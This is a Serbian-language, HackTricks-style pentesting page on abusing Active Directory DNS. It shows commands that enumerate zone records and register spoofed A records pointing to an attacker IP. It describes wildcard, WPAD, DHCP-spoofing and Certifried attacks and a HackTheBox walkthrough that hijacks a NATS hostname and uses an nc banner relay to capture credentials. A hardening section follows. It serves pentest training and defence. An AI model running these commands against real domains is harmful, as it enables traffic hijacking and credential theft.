# AD DNS zapisi

{{#include ../../banners/hacktricks-training.md}}

Podrazumevano, **svaki korisnik** u Active Directory-ju može da **nabroji sve DNS zapise** u DNS zonama domena ili šume, slično prenosu zone (korisnici mogu da izlistaju podređene objekte DNS zone u AD okruženju).

Alat [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) omogućava **nabrajanje** i **izvoz** **svih DNS zapisa** u zoni za potrebe izviđanja internih mreža.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (april 2025) dodaje JSON/Greppable (`--json`) izlaz, višestruko procesiranje DNS rezolucije i podršku za TLS 1.2/1.3 pri povezivanju na LDAPS  

Za više informacija pročitajte [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Kreiranje / izmena zapisa (ADIDNS spoofing)

Pošto grupa **Authenticated Users** podrazumevano ima dozvolu **Create Child** na DACL-u zone, svaki nalog domena (ili računara) može da registruje dodatne zapise. Ovo se može iskoristiti za otmicu saobraćaja, izazivanje NTLM relay-a ili čak potpuno kompromitovanje domena.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py dolazi uz Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Uobičajeni primitives za napad

1. **Wildcard record** – `*.<zone>` pretvara AD DNS server u responder za celu organizaciju, sličan LLMNR/NBNS spoofing-u. Može se zloupotrebiti za hvatanje NTLM hash-eva ili njihovo relay-ovanje ka LDAP/SMB-u.  (Zahteva da WINS-lookup bude onemogućen.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – dodajte `wpad` (ili **NS** record koji pokazuje na host napadača, kako bi se zaobišla Global-Query-Block-List) i transparentno proxy-ujte odlazne HTTP zahteve radi prikupljanja kredencijala. Microsoft je zakrpio zaobilaženja preko wildcard/DNAME (CVE-2018-8320), ali **NS-records i dalje rade**.<sup>[[1]](#references)</sup>    
3. **Preuzimanje zastarelog zapisa** – preuzmite IP adresu koja je ranije pripadala radnoj stanici, pa će pridruženi DNS zapis i dalje razrešavati ime. To omogućava resource-based constrained delegation ili Shadow-Credentials napade bez ikakvog menjanja DNS-a.    
4. **DHCP → DNS spoofing** – u podrazumevanoj Windows DHCP+DNS konfiguraciji, neautentifikovani napadač na istoj podmreži može da prepiše bilo koji postojeći A record (uključujući kontrolere domena) slanjem falsifikovanih DHCP zahteva koji pokreću dinamička DNS ažuriranja (Akamai „DDSpoof“, 2023).  To omogućava machine-in-the-middle napad na Kerberos/LDAP i može dovesti do potpunog preuzimanja domena.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – promenite `dNSHostName` mašinskog naloga koji kontrolišete, registrujte odgovarajući A record, a zatim zatražite sertifikat za to ime da biste se predstavljali kao DC. Alati poput **Certipy** ili **BloodyAD** u potpunosti automatizuju ovaj postupak.  

AD DNS record sa [serijalizovanim informacijama o odredištu](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) može biti deo uslovnog relay lanca: pozivaocu su potrebna prava za kreiranje zapisa, coercion putanja zbog koje se ciljni računar autentifikuje na to ime i relay odredište koje prihvata dobijenu autentifikaciju. Procenu odredišnog protokola obavite zasebno; SMB signing na dolaznoj vezi sam po sebi ne utvrđuje da li HTTPS WinRM odredište prihvata relay. Nivo zakrpa, obrada imena, Extended Protection i konfiguracija servisa mogu uticati na ishod.

---

### Otmica internih servisa putem zastarelih dinamičkih zapisa (studija slučaja NATS)

Kada su dinamička ažuriranja otvorena svim autentifikovanim korisnicima, **uklonjeno ime servisa može se ponovo preuzeti i usmeriti ka infrastrukturi napadača**. Mirage HTB DC je nakon DNS scavenging-a izložio hostname `nats-svc.mirage.htb`, pa je svaki korisnik sa niskim privilegijama mogao da:<sup>[[3]](#references)</sup>

1. **Potvrdi da zapis nedostaje** i sazna SOA pomoću `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Ponovo kreirajte zapis** ka eksternom/VPN interfejsu koji kontrolišu:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Impersoniranje plaintext servisa**. NATS klijenti očekuju da vide jedan `INFO { ... }` baner pre slanja akreditiva, pa je dovoljno kopirati legitimni baner sa pravog brokera da bi se prikupile tajne:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Svaki klijent koji razreši preoteto ime odmah će leak-ovati svoj JSON `CONNECT` okvir (uključujući `"user"`/`"pass"`) listener-u. Pokretanje zvaničnog binarnog fajla `nats-server -V` na hostu napadača, isključivanje redakcije logova ili jednostavno prisluškivanje sesije pomoću Wireshark-a daje iste kredencijale u otvorenom tekstu, jer je TLS bio opcionalan.

4. **Pivot sa uhvaćenim kredencijalima** – u Mirage-u je ukradeni NATS nalog omogućio pristup JetStream-u, koji je otkrio istorijske događaje autentifikacije sa ponovo upotrebljivim AD korisničkim imenima/lozinkama.

Ovaj obrazac važi za svaku uslugu integrisanu sa AD-om koja se oslanja na nezaštićene TCP rukovanja (HTTP API-je, RPC, MQTT itd.): kada se DNS zapis preotme, napadač postaje ta usluga.

---

## Detekcija i ojačavanje bezbednosti

* Uskratite **Authenticated Users** pravo *Create all child objects* na osetljivim zonama i delegirajte dynamic updates namenskom nalogu koji koristi DHCP.
* Ako su dynamic updates neophodna, podesite zonu na **Secure-only** i omogućite **Name Protection** u DHCP-u, tako da samo objekat računara vlasnika može da prepiše sopstveni zapis.
* Nadgledajte DNS Server event ID-jeve 257/252 (dynamic update), 770 (zone transfer) i LDAP upise u `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokirajte opasna imena (`wpad`, `isatap`, `*`) pomoću namerno-bezopasnog zapisa ili preko Global Query Block List.
* Održavajte DNS servere ažurnim – npr. RCE propusti CVE-2024-26224 i CVE-2024-26231 dostigli su **CVSS 9.8** i mogu se daljinski iskoristiti protiv Domain Controller-a.  

## References

- [1] [ADIDNS ponovo razmotren — WPAD, GQBL i još mnogo toga](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Lažiranje DNS zapisa zloupotrebom DHCP DNS dynamic updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: povezivanje NFS leak-ova, zloupotrebe Dynamic DNS-a, krađe NATS kredencijala, JetStream tajni i Kerberoasting-a](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Ulazak u zonu: izbacivanje Active Directory DNS-a pomoću adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
